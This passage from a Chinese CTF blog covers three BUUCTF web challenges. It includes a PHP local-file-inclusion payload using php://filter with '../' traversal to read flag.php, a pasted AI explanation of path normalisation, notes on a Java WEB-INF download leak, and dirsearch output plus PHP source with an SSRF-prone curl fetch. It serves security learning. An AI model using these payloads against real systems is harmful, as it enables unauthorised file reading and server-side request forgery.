class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100&quot;&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">header</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>--<span class="hljs-title">scroll</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100 <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>-<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">title</span>&quot;&gt;<span class="hljs-title">Had</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>?&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">spacer</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">header</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">ribbon</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">main</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">main</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__content</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">container</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">grid</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--2-<span class="hljs-title">col</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">tablet</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">phone</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">white</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">shadow</span>--4<span class="hljs-title">dp</span> <span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800 <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--8-<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">crumbs</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-500&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Cheer</span> <span class="hljs-title">up</span>!&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">                <span class="hljs-title">Did</span> <span class="hljs-title">you</span> <span class="hljs-title">have</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>? <span class="hljs-title">Did</span> <span class="hljs-title">things</span> <span class="hljs-title">not</span> <span class="hljs-title">go</span> <span class="hljs-title">your</span> <span class="hljs-title">way</span> <span class="hljs-title">today</span>? <span class="hljs-title">Are</span> <span class="hljs-title">you</span> <span class="hljs-title">feeling</span> <span class="hljs-title">down</span>? <span class="hljs-title">Pick</span> <span class="hljs-title">an</span> <span class="hljs-title">option</span> <span class="hljs-title">and</span> <span class="hljs-title">let</span> <span class="hljs-title">the</span> <span class="hljs-title">adorable</span> <span class="hljs-title">images</span> <span class="hljs-title">cheer</span> <span class="hljs-title">you</span> <span class="hljs-title">up</span>!</span><br><span class="hljs-class">              &lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">include</span>&quot;&gt;</span><br><span class="hljs-class">              &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">				$<span class="hljs-title">file</span> = $<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">category</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class">				<span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span><br><span class="hljs-class">				</span>&#123;<br>					<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))  <span class="hljs-comment">//要有匹配的字符才能进到下一步的include函数</span><br>						<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>					&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>					&#125;<br>				&#125;<br>				<span class="hljs-meta">?&gt;</span><br>			&lt;/div&gt;<br>          &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span> id=<span class="hljs-string">&quot;choice&quot;</span>&gt;<br>              &lt;center&gt;&lt;button onclick=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> name=<span class="hljs-string">&quot;category&quot;</span> value=<span class="hljs-string">&quot;woofers&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Woofers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">button</span> <span class="hljs-title">onclick</span>=&quot;<span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">choice</span>&#x27;).<span class="hljs-title">submit</span>();&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">category</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">meowers</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Meowers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">          &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">          &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">main</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">material</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>strpos()函数，匹配对应字符  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://512acbf5-c929-427e-aec6-d35d2e44994c.node5.buuoj.cn:81/flag.php<br><br><span class="hljs-comment">&lt;!-- Can you read this flag? --&gt;</span><br></code></pre></td></tr></table></figure>
<p>页面未返回404，说明flag就在站点默认目录下，并且是.php后缀<br>加上提示，就需要读取flag.php源码，<br>所以解法是利用index.php?category&#x3D;<br>里的include函数，使用伪协议编码读取flag.php的源码  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><br>解码得到flag  <br></code></pre></td></tr></table></figure>

<h2 id="notice-php的include函数访问目录解析："><a href="#notice-php的include函数访问目录解析：" class="headerlink" title="notice php的include函数访问目录解析："></a>notice php的include函数访问目录解析：</h2><p>kimi:<br>PHP的include函数在解析文件路径时会进行路径标准化，会按文件路径中的..&#x2F;进行目录跳转，即使没有实际的woofers文件目录。  </p>
<p>当woofers&#x2F;..&#x2F;flag.php被传入并交给include函数时，PHP会将其解析为flag.php，因为在路径解析过程中，..&#x2F;会跳过前面的woofers目录，最终只剩下flag.php，这也就导致了没有woofers文件目录的情况下也能解析到flag.php。  </p>
<p>为了防止这种情况，你应该对传入的文件名进行严格过滤和验证，避免包含目录跳转等特殊字符，只允许包含合法的文件名字符，确保传入的文件名符合预期的文件目录结构，并使用且绝对路径或限制目录范围等措施，来防止这种路径解析问题导致的安全风险。  </p>
<p>q:<br>听不懂，意思..&#x2F;解析的优先级大吗?</p>
<p>kimi:<br>在路径解析中，..&#x2F;的作用是返回上一级目录，它不是优先级的问题，而是一个路径解析的逻辑。<br>路径解析的逻辑:</p>
<blockquote>
<p>当 PHP 处理文件路径时，它是按照路径的逻辑来解析的。例如，对于路径woofers&#x2F;..&#x2F;flag.php，PHP 会先看到woofers目录，然后遇到..&#x2F;，这意味着要回到上一级目录。最后，再访问flag.php文件。<br>这个过程可以类比于你在文件系统中手动导航目录。假设你当前在某个目录下，先进入woofers子目录，然后又返回上一级目录（通过..&#x2F;），此时你又回到了原来的位置，接着再访问flag.php文件。<br>所以，在路径解析中，..&#x2F;会改变当前路径的逻辑位置，而不管文件系统中实际的目录是否存在。  </p>
</blockquote>
<p>为什么没有woofers目录也能解析:  </p>
<blockquote>
<p>PHP 在解析路径时，并不是先检查路径中的每个目录是否存在，而是先按照路径的逻辑进行标准化处理。<br>在路径woofers&#x2F;..&#x2F;flag.php中，woofers和..&#x2F;相互抵消，最终得到的路径是flag.php。PHP 会尝试去包含这个flag.php文件，不管前面的woofers目录是否存在。<br>这就好比你在数学中进行运算，5 + 3 - 3的结果是 5，中间的加和减操作是按照运算逻辑进行的，不管中间的数字是否代表实际存在的东西。<br>这种路径解析机制在 PHP 中是比较常见的，它允许灵活地引用文件，但也可能导致安全问题，如目录遍历攻击，这就是为什么需要对用户输入的文件名进行严格过滤和验证的原因。  </p>
</blockquote>
<p>我想大概意思就是会先解析完目录，再去访问目录是否存在，所以它是先解析完<br>woofers&#x2F;..&#x2F;flag.php  &#x3D;<br>&#x2F;flag<br>再去访问解析完的目录，而不会在解析时去访问woofers目录</p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>试了sql注入，点了hlep，然后试了一下常规的目录穿越，无果<br>用dirsearch扫出了&#x2F;images 访问，404，<br>得到服务器信息：<br>Apache Tomcat&#x2F;8.5.24  是一个基于java的服务端<br>直接访问了help.docx<br><a target="_blank" rel="noopener" href="http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx">http://420afca9-2c54-4dc1-9d86-cc41a97eb1bf.node5.buuoj.cn:81/help.docx</a><br>下载help.docx<br>里面只有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docx">Are you sure the flag is here? ? ?<br></code></pre></td></tr></table></figure>
<p>web题就不考虑docx隐写啥的了  </p>
<p>看wp：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a>  </p>
<p>直接搬过来：<br>WEB-INF 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"> WEB-<span class="hljs-keyword">INF</span>主要包含以下文件或目录：<br>/WEB-<span class="hljs-keyword">INF</span>/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-<span class="hljs-keyword">INF</span>/classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br>/WEB-<span class="hljs-keyword">INF</span>/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-<span class="hljs-keyword">INF</span>/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-<span class="hljs-keyword">INF</span>/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure>
<p>web.xml里记有映射的文件，似乎是把url的请求映射到指定的编译号的java程序，class文件，可能和php文件差不多吧  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/MrSoap/p/18356439">https://www.cnblogs.com/MrSoap/p/18356439</a><br>说的很清楚了  </p>
<p>漏洞成因：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a>    </p>
<p>反正最后是用download文件下载了flagcontainer的class文件，应该就是程序的源码？<br>或者啥的<br>然后里面有base64的flag  </p>
<p>这题如题，ez java<br>没接触过，不懂    </p>
<h2 id="class-文件是什么"><a href="#class-文件是什么" class="headerlink" title=".class 文件是什么"></a>.class 文件是什么</h2><p>.class 文件是Java编译器生成的字节码文件，它包含了Java源代码编译后的二进制表示。Java虚拟机（JVM）可以直接执行这些字节码文件，而无需依赖特定的硬件平台或操作系统</p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>上来是一个登录和注册页面，说分享故事啥的<br>上来养成好习惯，先按f12看一下前端留有啥，<br>搜了一下flag和php，没发现有啥  </p>
<p>那就用bp fuzz一下login界面<br>视乎无法注入  </p>
<p>然后再join试了好多，都是blog is not valid<br>扫了一下服务器：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[00:10:49]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /js  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/js/</span><br><span class="hljs-selector-attr">[00:11:17]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:11:37]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:11:57]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpeg</span><br><span class="hljs-selector-attr">[00:12:06]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.jpg</span><br><span class="hljs-selector-attr">[00:12:33]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:16:13]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /adm/style/admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:17:30]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /admin_my_avatar<span class="hljs-selector-class">.png</span><br><span class="hljs-selector-attr">[00:21:17]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">185</span>B  - /css  -&gt;  http:<span class="hljs-comment">//22e4b823-f430-45fb-9de3-bc621615b379.node5.buuoj.cn/css/</span><br><span class="hljs-selector-attr">[00:21:28]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /db<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:15]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /error<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:22:32]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">6</span>KB - /favicon<span class="hljs-selector-class">.ico</span><br><span class="hljs-selector-attr">[00:22:42]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /flag<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">571</span>B  - /js/<br><span class="hljs-selector-attr">[00:24:35]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:24:40]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /logo<span class="hljs-selector-class">.gif</span><br><span class="hljs-selector-attr">[00:27:44]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /resources/<span class="hljs-selector-class">.arch-internal-preview</span><span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:27:49]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[00:28:36]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /skin1_admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:29:57]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /user<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:30:20]</span> <span class="hljs-number">200</span> - <span class="hljs-number">1019</span>B  - /view.php<br></code></pre></td></tr></table></figure>
<p>有robots.txt,里面提示有一个<br>user.php.bak<br>备份文件  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>给deepseek一看，它说有ssrf漏洞，还没接触过呢<br>然后也是看懂这个网站的逻辑了，就是你能注册姓名和账号，然后把你的blog链接挂上去<br>所以blog那栏必须是域名还得是二级域名啥的，  </p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">便尝试：<br>http://cd541869-c627<span class="hljs-string">-4</span>baf<span class="hljs-string">-920</span>d<span class="hljs-string">-2</span>fd4728ad4f0.node5.buuoj.cn:81/flag.php<br>放上去当作blog链接<br></code></pre></td></tr></table></figure>
<p>一次放我正常的blog链接，<br>一次放：<br><a target="_blank" rel="noopener" href="http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php">http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php</a>  </p>
<p>没思路，不知道怎么下手，找wp看吧  </p>
